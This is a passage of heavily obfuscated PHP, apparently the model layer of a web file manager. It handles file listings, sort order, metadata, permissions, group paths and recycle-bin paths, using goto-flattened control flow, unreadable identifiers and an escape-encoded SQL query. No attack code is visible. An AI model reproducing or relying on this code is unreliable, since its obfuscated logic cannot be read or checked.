EÃËÊçùÔç; A²ô˜ã¯Ñ: $c‡‚”àËÃ× = $this->field($F¬øâŠÇâÑ)->_makeOrder()->where($EåùíäÍÂ)->selectPage($dÖÊ…ˆ¦øÅ); $this->_listDataApply($c‡‚”àËÃ×[$E¿ßó°Š²Õ[354]]); $this->_listMake($c‡‚”àËÃ×); goto d‡‚ÄÕßÙ; B‘ï“¹­›à: $E¿ßó°Š²Õ =& $_SERVER[í™]; if (!isset($EåùíäÍÂ[$E¿ßó°Š²Õ[397]])) { $EåùíäÍÂ[$E¿ßó°Š²Õ[397]] = 0; } $F¬øâŠÇâÑ = $E¿ßó°Š²Õ[398]; goto A²ô˜ã¯Ñ; EÃËÊçùÔç: } protected function _makeOrder() { goto a §Æì¥å™; a §Æì¥å™: $E¸ÇĞß÷È =& $_SERVER[í™]; $c†ÏŠ“¢ğ› = Model($E¸ÇĞß÷È[399])->get($E¸ÇĞß÷È[400]); $FÒŠùØ£ç¡ = Model($E¸ÇĞß÷È[399])->get($E¸ÇĞß÷È[401]); goto dï˜½ëÑ¯Í; Eçµá¿‹Äç: $aíÀ¸ÉİÙ¡ = Input::get($E¸ÇĞß÷È[408], $E¸ÇĞß÷È[7], $FÒŠùØ£ç¡, array_keys($B¦ñÔ™˜£)); if (!in_array($CĞ©ÒöÁ°Š, array_keys($A¢…Àùé‰Ø))) { $CĞ©ÒöÁ°Š = $E¸ÇĞß÷È[28]; } if (!in_array($aíÀ¸ÉİÙ¡, array_keys($B¦ñÔ™˜£))) { $CĞ©ÒöÁ°Š = $E¸ÇĞß÷È[402]; } goto aî¥ø®Ä‚; dï˜½ëÑ¯Í: $B¦ñÔ™˜£ = array($E¸ÇĞß÷È[402] => $E¸ÇĞß÷È[403], $E¸ÇĞß÷È[404] => $E¸ÇĞß÷È[405]); $A¢…Àùé‰Ø = array($E¸ÇĞß÷È[28] => $E¸ÇĞß÷È[28], $E¸ÇĞß÷È[77] => $E¸ÇĞß÷È[77], $E¸ÇĞß÷È[160] => $E¸ÇĞß÷È[372], $E¸ÇĞß÷È[378] => $E¸ÇĞß÷È[378], $E¸ÇĞß÷È[406] => $E¸ÇĞß÷È[379], $E¸ÇĞß÷È[187] => $E¸ÇĞß÷È[187], $E¸ÇĞß÷È[107] => $E¸ÇĞß÷È[107]); $CĞ©ÒöÁ°Š = Input::get($E¸ÇĞß÷È[407], $E¸ÇĞß÷È[7], $c†ÏŠ“¢ğ›, array_keys($A¢…Àùé‰Ø)); goto Eçµá¿‹Äç; aî¥ø®Ä‚: if ($CĞ©ÒöÁ°Š == $E¸ÇĞß÷È[28]) { } $eß›ŒÇŞ = $E¸ÇĞß÷È[409] . $A¢…Àùé‰Ø[$CĞ©ÒöÁ°Š] . $E¸ÇĞß÷È[50] . $B¦ñÔ™˜£[$aíÀ¸ÉİÙ¡]; return $this->order(rtrim(trim($eß›ŒÇŞ), $E¸ÇĞß÷È[47])); goto Dßğ‘¸ƒá; Dßğ‘¸ƒá: } protected function _listDataApplyItem($Aİê¤Ë‚ù, $fã²ìôï®é = false) { $a²ÎèŠ¢öğ = array($Aİê¤Ë‚ù); $this->_listDataApply($a²ÎèŠ¢öğ, $fã²ìôï®é); return $a²ÎèŠ¢öğ[0]; } protected function _listDataApply(&$c²ŒÃ¾É, $D—•§ÀŠ‡‘ = false) { goto BØï¥ç‹Û•; cƒÂùô²®: $this->_listAppendUser($c²ŒÃ¾É); $this->_listFilterInfo($c²ŒÃ¾É, $D—•§ÀŠ‡‘); goto b¶‰Ä™Á×‡; F¹²„—§: $dÜà„ˆ’µ = array_unique($dÜà„ˆ’µ); $this->_listSourceCache($c²ŒÃ¾É); if (!$D—•§ÀŠ‡‘) { $this->_listAppendMeta($c²ŒÃ¾É, $dÜà„ˆ’µ); $this->_listAppendFileMeta($c²ŒÃ¾É, $dÜà„ˆ’µ); $this->_listAppendChildren($c²ŒÃ¾É, $dÜà„ˆ’µ); } goto EÈïÁ¥ÄÁ¿; BØï¥ç‹Û•: $Ağß¸ÓåêÁ =& $_SERVER[í™]; if (!$c²ŒÃ¾É) { $c²ŒÃ¾É = array(); return; } $dÜà„ˆ’µ = array_to_keyvalue($c²ŒÃ¾É, $Ağß¸ÓåêÁ[33], $Ağß¸ÓåêÁ[369]); goto F¹²„—§; EÈïÁ¥ÄÁ¿: $this->_listAppendPath($c²ŒÃ¾É); $this->_listAppendAuth($c²ŒÃ¾É); $this->_listAppendSourceInfo($c²ŒÃ¾É, $dÜà„ˆ’µ); goto cƒÂùô²®; b¶‰Ä™Á×‡: } protected function _listSourceCache($bëÜ«ÛÀÉ) { $d±©‹¼êò =& $_SERVER[í™]; foreach ($bëÜ«ÛÀÉ as $F¡–í‚¥) { self::$cacheSourceInfo[$d±©‹¼êò[410] . $F¡–í‚¥[$d±©‹¼êò[369]]] = $F¡–í‚¥; } } protected function _listFilterInfo(&$Cõ÷ë–‹¢¾, $a‚­š –¢ = false) { $aä¯¨ÜÓæ¾ =& $_SERVER[í™]; foreach ($Cõ÷ë–‹¢¾ as &$c¢øÆæàÔë) { $c¢øÆæàÔë = $this->pathInfoFilter($c¢øÆæàÔë); self::$cachePathInfo[$aä¯¨ÜÓæ¾[411] . intval($a‚­š –¢) . $aä¯¨ÜÓæ¾[412] . $c¢øÆæàÔë[$aä¯¨ÜÓæ¾[369]]] = $c¢øÆæàÔë; } } protected function _listMake(&$c³Ãöá•„) { $cÊ±Œ•ÙŸ‡ =& $_SERVER[í™]; $c³Ãöá•„[$cÊ±Œ•ÙŸ‡[74]] = array(); $c³Ãöá•„[$cÊ±Œ•ÙŸ‡[73]] = array(); foreach ($c³Ãöá•„[$cÊ±Œ•ÙŸ‡[354]] as $c¤‚Ò·ï¹) { $fß§”§»… = $c¤‚Ò·ï¹[$cÊ±Œ•ÙŸ‡[370]] == 1 ? $cÊ±Œ•ÙŸ‡[74] : $cÊ±Œ•ÙŸ‡[73]; $c³Ãöá•„[$fß§”§»…][] = $c¤‚Ò·ï¹; } unset($c³Ãöá•„[$cÊ±Œ•ÙŸ‡[354]]); } protected function _listAppendMeta(&$b¦ÕÚè‘¦¬, $AóÆ´±Ÿã) { goto AÏ»ÄÕ­â; AÏ»ÄÕ­â: $fÖ™ÊÙô¸Í =& $_SERVER[í™]; $fÃ×™÷ØÀ‡ = array($fÖ™ÊÙô¸Í[383] => array($fÖ™ÊÙô¸Í[384], $AóÆ´±Ÿã)); $c®¬„ÊãÊà = Model($fÖ™ÊÙô¸Í[413])->field($fÖ™ÊÙô¸Í[414])->where($fÃ×™÷ØÀ‡)->select(); goto b¯’“ˆ±; A°±Ô¹ˆ: foreach ($c®¬„ÊãÊà as $fĞ†Éîé´‚) { if (!isset($A±©šàß´œ[$fĞ†Éîé´‚[$fÖ™ÊÙô¸Í[369]]])) { $A±©šàß´œ[$fĞ†Éîé´‚[$fÖ™ÊÙô¸Í[369]]] = array(); } if (in_array($fĞ†Éîé´‚[$fÖ™ÊÙô¸Í[89]], $D¥¸š±˜¢‚)) { continue; } $A±©šàß´œ[$fĞ†Éîé´‚[$fÖ™ÊÙô¸Í[369]]][$fĞ†Éîé´‚[$fÖ™ÊÙô¸Í[89]]] = $fĞ†Éîé´‚[$fÖ™ÊÙô¸Í[359]]; } foreach ($b¦ÕÚè‘¦¬ as &$F¯ŠÅÜ‹‹Ş) { $F¯ŠÅÜ‹‹Ş[$fÖ™ÊÙô¸Í[417]] = !1; if (isset($A±©šàß´œ[$F¯ŠÅÜ‹‹Ş[$fÖ™ÊÙô¸Í[369]]])) { $F¯ŠÅÜ‹‹Ş[$fÖ™ÊÙô¸Í[417]] = $A±©šàß´œ[$F¯ŠÅÜ‹‹Ş[$fÖ™ÊÙô¸Í[369]]]; } if ($this->fileIsLock($F¯ŠÅÜ‹‹Ş) && $F¯ŠÅÜ‹‹Ş[$fÖ™ÊÙô¸Í[376]]) { $cœÌ‰šãÎ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $F¯ŠÅÜ‹‹Ş[$fÖ™ÊÙô¸Í[376]][$fÖ™ÊÙô¸Í[377]] = AuthModel::authDisable($F¯ŠÅÜ‹‹Ş[$fÖ™ÊÙô¸Í[376]][$fÖ™ÊÙô¸Í[377]], $cœÌ‰šãÎ); $F¯ŠÅÜ‹‹Ş[$fÖ™ÊÙô¸Í[376]][$fÖ™ÊÙô¸Í[418]][$fÖ™ÊÙô¸Í[376]] = $F¯ŠÅÜ‹‹Ş[$fÖ™ÊÙô¸Í[376]][$fÖ™ÊÙô¸Í[377]]; } } goto FÂË‚¦™âª; b¯’“ˆ±: if (!$c®¬„ÊãÊà) { return; } $D¥¸š±˜¢‚ = array($fÖ™ÊÙô¸Í[415], $fÖ™ÊÙô¸Í[416]); $A±©šàß´œ = array(); goto A°±Ô¹ˆ; FÂË‚¦™âª: } protected function _listAppendFileMeta(&$cÊÈˆ—™Å, $dÉ¼‹Ò³ö) { goto a¯Èä‡Æã¡; Cõ­á´“Ö¿: $DíøøŠæÀï = $DíøøŠæÀï ? $DíøøŠæÀï : array(); $eâ¢æÙ¡Î = array(); foreach ($DíøøŠæÀï as $b—ØòõÒ) { if (!isset($eâ¢æÙ¡Î[$b—ØòõÒ[$déß¤âñ†à[419]]])) { $eâ¢æÙ¡Î[$b—ØòõÒ[$déß¤âñ†à[419]]] = array(); } $eâ¢æÙ¡Î[$b—ØòõÒ[$déß¤âñ†à[419]]][$b—ØòõÒ[$déß¤âñ†à[89]]] = $b—ØòõÒ[$déß¤âñ†à[359]]; } goto cÎ§·¯ã“õ; FÕ­î¶Şù²: $fğÌÀë·Ë = Model($déß¤âñ†à[422])->field($F®óßÜ”¿®)->where($bŸõ¡«ÀµÒ)->select(); $fğÌÀë·Ë = array_to_keyvalue($fğÌÀë·Ë, $déß¤âñ†à[419]); $DíøøŠæÀï = Model($déß¤âñ†à[423])->field($déß¤âñ†à[424])->where($bŸõ¡«ÀµÒ)->select(); goto Cõ­á´“Ö¿; cÎ§·¯ã“õ: foreach ($cÊÈˆ—™Å as &$E®¯¡¼º¶«) { goto BˆÔ½‰‘â; Eƒ”¹„‚Œ: if (isset($E®¯¡¼º¶«[$déß¤âñ†à[162]][$déß¤âñ†à[426]])) { $E®¯¡¼º¶«[$déß¤âñ†à[426]] = json_decode($E®¯¡¼º¶«[$déß¤âñ†à[162]][$déß¤âñ†à[426]], !0); unset($E®¯¡¼º¶«[$déß¤âñ†à[162]][$déß¤âñ†à[426]]); } goto Bª«—ó»‘Å; BˆÔ½‰‘â: $f¡»„—µÈÊ = $E®¯¡¼º¶«[$déß¤âñ†à[419]]; if (!$f¡»„—µÈÊ || !isset($fğÌÀë·Ë[$f¡»„—µÈÊ])) { continue; } $dÑ¦ïÄéÅ = $fğÌÀë·Ë[$f¡»„—µÈÊ]; goto bğ®“È‰ Ò; f‡­êëá—Ü: unset($fğÌÀë·Ë[$f¡»„—µÈÊ][$déß¤âñ†à[75]]); $EÎ÷“ê¦î = is_array($eâ¢æÙ¡Î[$f¡»„—µÈÊ]) ? $eâ¢æÙ¡Î[$f¡»„—µÈÊ] : array(); $E®¯¡¼º¶«[$déß¤âñ†à[162]] = array_merge($EÎ÷“ê¦î, $fğÌÀë·Ë[$f¡»„—µÈÊ]); goto Eƒ”¹„‚Œ; bğ®“È‰ Ò: $dÑ¦ïÄéÅ[$déß¤âñ†à[77]] = $E®¯¡¼º¶«[$déß¤âñ†à[77]]; $dÑ¦ïÄéÅ[$déß¤âñ†à[28]] = $E®¯¡¼º¶«[$déß¤âñ†à[28]]; self::$cacheFileInfo[$déß¤âñ†à[425] . $f¡»„—µÈÊ] = $dÑ¦ïÄéÅ; goto f‡­êëá—Ü; Bª«—ó»‘Å: } goto D¥ïØ£‚Êø; a¯Èä‡Æã¡: $déß¤âñ†à =& $_SERVER[í™]; $Eùßë¥è£ = array_to_keyvalue($cÊÈˆ—™Å, $déß¤âñ†à[33], $déß¤âñ†à[419]); $Eùßë¥è£ = array_filter(array_unique($Eùßë¥è£)); goto cÃ¦äƒóÑµ; cÃ¦äƒóÑµ: if (!$Eùßë¥è£) { return; } $bŸõ¡«ÀµÒ = array($déß¤âñ†à[420] => array($déß¤âñ†à[384], $Eùßë¥è£)); $F®óßÜ”¿® = $déß¤âñ†à[421]; goto FÕ­î¶Şù²; D¥ïØ£‚Êø: } protected function _listAppendSourceInfo(&$f¾÷›¿’Íá, $Aåã„³ ÎÎ) { goto D˜·ô¹ˆÖ; FŠŠˆ £¬Ğ: $Aô‹¡Ä‹©± = array_to_keyvalue($Aì„ÎˆÚô, $bªì´×÷˜ê[367]); $fìò™Œ×à‡ = array_to_keyvalue_group($C‘š›÷†ÎÙ, $bªì´×÷˜ê[75], $bªì´×÷˜ê[393]); $AŒÙ«‚É¤Ñ = array_to_keyvalue($d ˆ¸œğÃØ, $bªì´×÷˜ê[75]); goto BíØªËõ§; BíØªËõ§: $DÎ§©éöò’ = array_to_keyvalue_group($c£äËä„÷š, $bªì´×÷˜ê[369]); foreach ($f¾÷›¿’Íá as &$bààìë­Ë™) { $bààìë­Ë™[$bªì´×÷˜ê[391]] = array($bªì´×÷˜ê[430] => 0, $bªì´×÷˜ê[431] => 0, $bªì´×÷˜ê[432] => 0); if (isset($AŒÙ«‚É¤Ñ[$bààìë­Ë™[$bªì´×÷˜ê[369]]])) { $bààìë­Ë™[$bªì´×÷˜ê[391]][$bªì´×÷˜ê[433]] = 1; $bààìë­Ë™[$bªì´×÷˜ê[391]][$bªì´×÷˜ê[434]] = $AŒÙ«‚É¤Ñ[$bààìë­Ë™[$bªì´×÷˜ê[369]]][$bªì´×÷˜ê[28]]; } if (isset($fìò™Œ×à‡[$bààìë­Ë™[$bªì´×÷˜ê[369]]])) { $bààìë­Ë™[$bªì´×÷˜ê[391]][$bªì´×÷˜ê[435]] = array(); foreach ($fìò™Œ×à‡[$bààìë­Ë™[$bªì´×÷˜ê[369]]] as $D‡Ù£ø«… ) { $cª¼Êî‚Şì = $Aô‹¡Ä‹©±[$D‡Ù£ø«… ]; $bààìë­Ë™[$bªì´×÷˜ê[391]][$bªì´×÷˜ê[435]][] = array($bªì´×÷˜ê[436] => $cª¼Êî‚Şì[$bªì´×÷˜ê[367]], $bªì´×÷˜ê[386] => $cª¼Êî‚Şì[$bªì´×÷˜ê[28]], $bªì´×÷˜ê[437] => $cª¼Êî‚Şì[$bªì´×÷˜ê[438]]); } } if (isset($DÎ§©éöò’[$bààìë­Ë™[$bªì´×÷˜ê[369]]])) { $bààìë­Ë™[$bªì´×÷˜ê[391]][$bªì´×÷˜ê[439]] = array(); foreach ($DÎ§©éöò’[$bààìë­Ë™[$bªì´×÷˜ê[369]]] as $E÷‰¸……Ù¡) { $bààìë­Ë™[$bªì´×÷˜ê[391]][$bªì´×÷˜ê[439]] = array($bªì´×÷˜ê[440] => $E÷‰¸……Ù¡[$bªì´×÷˜ê[441]], $bªì´×÷˜ê[442] => $E÷‰¸……Ù¡[$bªì´×÷˜ê[443]], $bªì´×÷˜ê[444] => $E÷‰¸……Ù¡[$bªì´×÷˜ê[369]], $bªì´×÷˜ê[445] => $E÷‰¸……Ù¡[$bªì´×÷˜ê[446]], $bªì´×÷˜ê[447] => $E÷‰¸……Ù¡[$bªì´×÷˜ê[448]], $bªì´×÷˜ê[449] => $E÷‰¸……Ù¡[$bªì´×÷˜ê[449]], $bªì´×÷˜ê[450] => $E÷‰¸……Ù¡[$bªì´×÷˜ê[450]]); } } } return $f¾÷›¿’Íá; goto AÎğ¢®Ï£ó; D˜·ô¹ˆÖ: $bªì´×÷˜ê =& $_SERVER[í™]; if (!defined($bªì´×÷˜ê[427])) { return; } $Aì„ÎˆÚô = Model($bªì´×÷˜ê[428])->listData(); goto eèøÒììì¢; eèøÒììì¢: $C‘š›÷†ÎÙ = Model($bªì´×÷˜ê[392])->listData(); $d ˆ¸œğÃØ = Model($bªì´×÷˜ê[381])->listData(); $c£äËä„÷š = Model($bªì´×÷˜ê[429])->listSimple(); goto FŠŠˆ £¬Ğ; AÎğ¢®Ï£ó: } protected function _listAppendChildren(&$EòÕó¢¶¡¯, $a›¬†¸Ûè) { goto BËô„¯Ï¹¤; c¾•åİ†®ù: foreach ($EòÕó¢¶¡¯ as &$F¿×ÆÁÅ–) { if ($F¿×ÆÁÅ–[$F›¨‘§ïÅÁ[370]]) { unset($F¿×ÆÁÅ–[$F›¨‘§ïÅÁ[372]]); $F¿×ÆÁÅ–[$F›¨‘§ïÅÁ[192]] = intval($B«ï‡šˆë[$F¿×ÆÁÅ–[$F›¨‘§ïÅÁ[369]] . $F›¨‘§ïÅÁ[453]][$F›¨‘§ïÅÁ[454]]); $F¿×ÆÁÅ–[$F›¨‘§ïÅÁ[191]] = intval($B«ï‡šˆë[$F¿×ÆÁÅ–[$F›¨‘§ïÅÁ[369]] . $F›¨‘§ïÅÁ[455]][$F›¨‘§ïÅÁ[454]]); } } goto FÃ±Ê¾ßƒ; f³ö¸š¯¥Ó: $eî™É´Ò½ = 1024 * 50; $EòÕó¢¶¡¯ = is_array($EòÕó¢¶¡¯) ? $EòÕó¢¶¡¯ : array(); $FÔÙ Ãó† = count($EòÕó¢¶¡¯); goto Aß±¥š…½; BËô„¯Ï¹¤: $F›¨‘§ïÅÁ =& $_SERVER[í™]; $BÔ†ñ–¹¾” = $F›¨‘§ïÅÁ[361]; $B«ï‡šˆë = array(); goto f³ö¸š¯¥Ó; Aß±¥š…½: $C•ÎÊ‚‹ = $this->tablePrefix . $this->tableName; for ($C¨ôÛŞœ¤ = 0; $C¨ôÛŞœ¤ < $FÔÙ Ãó†; $C¨ôÛŞœ¤++) { $eßÒ¹•Õ™‚ = intval($EòÕó¢¶¡¯[$C¨ôÛŞœ¤][$F›¨‘§ïÅÁ[397]]); if ($EòÕó¢¶¡¯[$C¨ôÛŞœ¤][$F›¨‘§ïÅÁ[370]]) { $b½î–àÕ = $EòÕó¢¶¡¯[$C¨ôÛŞœ¤][$F›¨‘§ïÅÁ[369]]; $BÔ†ñ–¹¾” .= "\123\105\x4c\105\x43\124\40\x2a\x20\106\122\117\115\x20\x28\x53\x45\114\105\103\124\40\47{$b½î–àÕ}\137\x68\x61\x73\106\151\154\x65\47\x20\x61\163\x20\x68\141\163\x2c\143\157\165\x6e\x74\x28\x31\x29\x20\x61\163\x20\x68\141\x73\x43\x6f\x75\156\x74\40\x46\122\x4f\x4d\40\140{$C•ÎÊ‚‹}\140\x20\xa\x9\11\11\11\x9\167\x68\145\x72\x65\x20\160\x61\x72\x65\156\x74\x49\104\x3d{$b½î–àÕ}\x20\x61\x6e\x64\x20\151\x73\x46\157\x6c\144\x65\162\x3d\60\40\141\156\144\40\x69\x73\x44\145\154\145\164\145\75{$eßÒ¹•Õ™‚}\x29\40\141\x73\x20\x74\142\61\x5f{$b½î–àÕ}\40\x75\x6e\x69\x6f\156\x20\141\x6c\x6c\x20\12\11\11\x9\11\11\123\105\114\x45\x43\x54\x20\x2a\x20\x46\122\117\x4d\40\50\x53\105\x4c\x45\103\x54\x20\x27{$b½î–àÕ}\137\x68\141\163\106\157\154\x64\x65\x72\x27\x20\141\163\x20\x68\x61\163\106\151\154\x65\54\x63\157\165\156\x74\50\61\x29\40\x61\163\40\x68\141\163\103\157\x75\156\164\40\106\x52\117\115\x20\140{$C•ÎÊ‚‹}\140\40\12\x9\x9\x9\x9\x9\167\150\x65\162\x65\x20\x70\x61\x72\x65\156\x74\x49\104\75{$b½î–àÕ}\x20\141\156\x64\40\x69\163\106\x6f\x6c\144\145\162\75\x31\40\141\156\x64\x20\151\x73\x44\145\x6c\145\164\x65\75{$eßÒ¹•Õ™‚}\x29\40\x61\163\x20\x74\x62\62\x5f{$b½î–àÕ}\x20\x75\156\x69\157\156\x20\141\x6c\154\40"; } if ((strlen($BÔ†ñ–¹¾”) >= $eî™É´Ò½ || $C¨ôÛŞœ¤ == $FÔÙ Ãó† - 1) && $BÔ†ñ–¹¾”) { $BÔ†ñ–¹¾” = substr($BÔ†ñ–¹¾”, 0, -strlen($F›¨‘§ïÅÁ[451])); $FÀ”¡º¬Õ = $this->query($BÔ†ñ–¹¾”); $B«ï‡šˆë = array_merge($B«ï‡šˆë, $FÀ”¡º¬Õ); $BÔ†ñ–¹¾” = $F›¨‘§ïÅÁ[33]; } } $B«ï‡šˆë = array_to_keyvalue($B«ï‡šˆë, $F›¨‘§ïÅÁ[452]); goto c¾•åİ†®ù; FÃ±Ê¾ßƒ: } protected function _listAppendAuth(&$b¶ÆÔ™µ®‰) { goto fµ¢´Ğ‹; däËÛÛœŠÂ: $E¥ä›¶·²œ = Model($bŞĞÏŠŒ²¦[456])->getSourceList($BİñÍ®¹½, $A—¬ß©¹™); foreach ($b¶ÆÔ™µ®‰ as $CœâˆÌØ—½ => &$AÉä»»­‡ò) { $AÉä»»­‡ò[$bŞĞÏŠŒ²¦[376]] = $E¥ä›¶·²œ[$AÉä»»­‡ò[$bŞĞÏŠŒ²¦[369]]]; if (!$AÉä»»­‡ò[$bŞĞÏŠŒ²¦[376]] && $AÉä»»­‡ò[$bŞĞÏŠŒ²¦[371]] == self::TYPE_GROUP) { $AÉä»»­‡ò[$bŞĞÏŠŒ²¦[376]] = Action($bŞĞÏŠŒ²¦[457])->pathGroupAuthMake($AÉä»»­‡ò[$bŞĞÏŠŒ²¦[458]]); if (!$AÉä»»­‡ò[$bŞĞÏŠŒ²¦[376]] && !_get($GLOBALS, $bŞĞÏŠŒ²¦[459])) { $AÉä»»­‡ò[$bŞĞÏŠŒ²¦[189]] = !1; $AÉä»»­‡ò[$bŞĞÏŠŒ²¦[188]] = !1; } } if ($AÉä»»­‡ò[$bŞĞÏŠŒ²¦[376]]) { $AÉä»»­‡ò[$bŞĞÏŠŒ²¦[189]] = AuthModel::authCheckEdit($AÉä»»­‡ò[$bŞĞÏŠŒ²¦[376]][$bŞĞÏŠŒ²¦[377]]); $AÉä»»­‡ò[$bŞĞÏŠŒ²¦[188]] = AuthModel::authCheckView($AÉä»»­‡ò[$bŞĞÏŠŒ²¦[376]][$bŞĞÏŠŒ²¦[377]]); } $this->groupPathDisplay($AÉä»»­‡ò); } goto E‘£·ôÓˆ; fµ¢´Ğ‹: $bŞĞÏŠŒ²¦ =& $_SERVER[í™]; if (!defined($bŞĞÏŠŒ²¦[427])) { return; } $BİñÍ®¹½ = array(); goto eÜôÒ§¨¤¢; eÜôÒ§¨¤¢: foreach ($b¶ÆÔ™µ®‰ as $AÉä»»­‡ò) { if ($AÉä»»­‡ò[$bŞĞÏŠŒ²¦[371]] == self::TYPE_GROUP) { $BİñÍ®¹½[] = $AÉä»»­‡ò[$bŞĞÏŠŒ²¦[369]]; } } if (!$BİñÍ®¹½) { return; } $A—¬ß©¹™ = array_to_keyvalue($b¶ÆÔ™µ®‰, $bŞĞÏŠŒ²¦[369]); goto däËÛÛœŠÂ; E‘£·ôÓˆ: } public function groupPathDisplay(&$a‰‹†‹Ïãù) { goto f†âßÇŸŞ•; Aà‹‰§óŠƒ: $C†ÅöŠ‹– = $this->parentLevelArray($d½š® î¬×[$c¾ƒ ÂØÔ™[461]]); $FˆÊÙ¹ÅìÔ = $c¾ƒ ÂØÔ™[33]; foreach ($C†ÅöŠ‹– as $BïªÓÂ§²ˆ) { $AÓÉèÙ = Model($c¾ƒ ÂØÔ™[460])->getInfo($BïªÓÂ§²ˆ); $FˆÊÙ¹ÅìÔ .= $AÓÉèÙ[$c¾ƒ ÂØÔ™[391]][$c¾ƒ ÂØÔ™[369]] . $c¾ƒ ÂØÔ™[47]; } goto fÊ²óÄ´Û“; fÊ²óÄ´Û“: $a‰‹†‹Ïãù[$c¾ƒ ÂØÔ™[462]] = $d½š® î¬×[$c¾ƒ ÂØÔ™[463]]; $a‰‹†‹Ïãù[$c¾ƒ ÂØÔ™[380]] = $d½š® î¬×[$c¾ƒ ÂØÔ™[461]]; $a‰‹†‹Ïãù[$c¾ƒ ÂØÔ™[464]] = $d½š® î¬×[$c¾ƒ ÂØÔ™[465]]; goto b±ËäˆÕá¾; b±ËäˆÕá¾: $a‰‹†‹Ïãù[$c¾ƒ ÂØÔ™[466]] = $FˆÊÙ¹ÅìÔ . $d½š® î¬×[$c¾ƒ ÂØÔ™[391]][$c¾ƒ ÂØÔ™[369]]; goto F±±¨İ…Ş; f†âßÇŸŞ•: $c¾ƒ ÂØÔ™ =& $_SERVER[í™]; if ($a‰‹†‹Ïãù[$c¾ƒ ÂØÔ™[371]] != self::TYPE_GROUP) { return; } $d½š® î¬× = Model($c¾ƒ ÂØÔ™[460])->getInfo($a‰‹†‹Ïãù[$c¾ƒ ÂØÔ™[458]]); goto Aà‹‰§óŠƒ; F±±¨İ…Ş: } protected function _listAppendPath(&$B³©ÇŸÆÏŒ) { goto aš”«ÕÆŠí; EÃ…Ì·Ì‡³: $D †î‹Æ‘ = array(); foreach ($B„ÂªÎ¶Å§ as $dõ·ò°ã›¹ => $d¥ÃÆÚˆÙ¾) { if (!$d¥ÃÆÚˆÙ¾) { $D †î‹Æ‘[] = $dõ·ò°ã›¹; } } if ($D †î‹Æ‘) { $a‹àòÒ»šŸ = array($DÄà¿Ä¨á×[383] => array($DÄà¿Ä¨á×[384], $D †î‹Æ‘)); if (count($D †î‹Æ‘) == 1) { $cªå‡Å›„¯ = $this->sourceInfo($D †î‹Æ‘[0]); $cªå‡Å›„¯ = is_array($cªå‡Å›„¯) ? array($cªå‡Å›„¯) : !1; } else { $cªå‡Å›„¯ = $this->field($DÄà¿Ä¨á×[467])->where($a‹àòÒ»šŸ)->select(); } $Dšë•éÛ ‹ = array_to_keyvalue($cªå‡Å›„¯, $DÄà¿Ä¨á×[369], $DÄà¿Ä¨á×[28]); $B„ÂªÎ¶Å§ = array_merge_index($B„ÂªÎ¶Å§, $Dšë•éÛ ‹); } goto BóŸ ›«Êñ; BóŸ ›«Êñ: $BÂš”Ç”‡Ğ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($B³©ÇŸÆÏŒ as &$C‚¢™´´æñ) { goto B‡ùíÄƒí; Dó½ˆ‰å×Ã: if ($cìöèß„Ã) { $b­ô±êÕ² .= $C‚¢™´´æñ[$DÄà¿Ä¨á×[28]]; } if ($C‚¢™´´æñ[$DÄà¿Ä¨á×[370]]) { $b­ô±êÕ² .= $DÄà¿Ä¨á×[8]; } $C‚¢™´´æñ[$DÄà¿Ä¨á×[468]] = str_replace($DÄà¿Ä¨á×[469], $DÄà¿Ä¨á×[8], $b­ô±êÕ²); goto Dò‡ô‡ÉŒè; Dò‡ô‡ÉŒè: $a¦¬‘ˆ‹Û± = trim($C‚¢™´´æñ[$DÄà¿Ä¨á×[468]], $DÄà¿Ä¨á×[8]); if ($C‚¢™´´æñ[$DÄà¿Ä¨á×[463]] == $DÄà¿Ä¨á×[470] && $a¦¬‘ˆ‹Û±) { $C‚¢™´´æñ[$DÄà¿Ä¨á×[28]] = $a¦¬‘ˆ‹Û±; } $this->_listAppendPathRecycle($C‚¢™´´æñ, $cìöèß„Ã, $BÂš”Ç”‡Ğ); goto b¡™“…å´á; B‡ùíÄƒí: $cìöèß„Ã = $this->parentLevelArray($C‚¢™´´æñ[$DÄà¿Ä¨á×[461]]); $b­ô±êÕ² = $this->_listAppendPathRoot($C‚¢™´´æñ, $cìöèß„Ã); foreach ($cìöèß„Ã as $bìÓÚ‚®) { if (isset($B„ÂªÎ¶Å§[$bìÓÚ‚®])) { $b­ô±êÕ² .= $B„ÂªÎ¶Å§[$bìÓÚ‚®] . $DÄà¿Ä¨á×[8]; } } goto Dó½ˆ‰å×Ã; b¡™“…å´á: } goto dÁŠÚÄİ®; aš”«ÕÆŠí: $DÄà¿Ä¨á× =& $_SERVER[í™]; $B„ÂªÎ¶Å§ = array(); foreach ($B³©ÇŸÆÏŒ as &$C‚¢™´´æñ) { $B„ÂªÎ¶Å§[$C‚¢™´´æñ[$DÄà¿Ä¨á×[369]]] = $C‚¢™´´æñ[$DÄà¿Ä¨á×[28]]; $cìöèß„Ã = $this->parentLevelArray($C‚¢™´´æñ[$DÄà¿Ä¨á×[461]]); array_shift($cìöèß„Ã); foreach ($cìöèß„Ã as $bìÓÚ‚®) { if (!isset($B„ÂªÎ¶Å§[$bìÓÚ‚®])) { $B„ÂªÎ¶Å§[$bìÓÚ‚®] = 0; } } } goto EÃ…Ì·Ì‡³; dÁŠÚÄİ®: } private function _listAppendPathRecycle(&$b áÇ‡í¶å, $aõŠ§ßÎÔê, $fÎïî†¡˜ˆ) { goto C†Ü’Š‘…; aš¹õ¾»ë¾: $b áÇ‡í¶å[$A»Ä‹Ø¾İ“[461]] = $A»Ä‹Ø¾İ“[472] . implode($A»Ä‹Ø¾İ“[47], array_slice($aõŠ§ßÎÔê, 1)) . $A»Ä‹Ø¾İ“[47]; if ($b áÇ‡í¶å[$A»Ä‹Ø¾İ“[369]] == $fÎïî†¡˜ˆ) { $b áÇ‡í¶å[$A»Ä‹Ø¾İ“[461]] = $A»Ä‹Ø¾İ“[472]; $b áÇ‡í¶å[$A»Ä‹Ø¾İ“[463]] = $A»Ä‹Ø¾İ“[470]; $b áÇ‡í¶å[$A»Ä‹Ø¾İ“[28]] = LNG($A»Ä‹Ø¾İ“[471]); } $b áÇ‡í¶å[$A»Ä‹Ø¾İ“[473]] = $A»Ä‹Ø¾İ“[474]; goto D‹•µ¦Õ¼£; A®ã¿®Ï: $AÉ§½ŞÉà = explode($A»Ä‹Ø¾İ“[8], trim($b áÇ‡í¶å[$A»Ä‹Ø¾İ“[468]], $A»Ä‹Ø¾İ“[8])); $d‹…„×½«­ = implode($A»Ä‹Ø¾İ“[8], array_slice($AÉ§½ŞÉà, 2)); $b 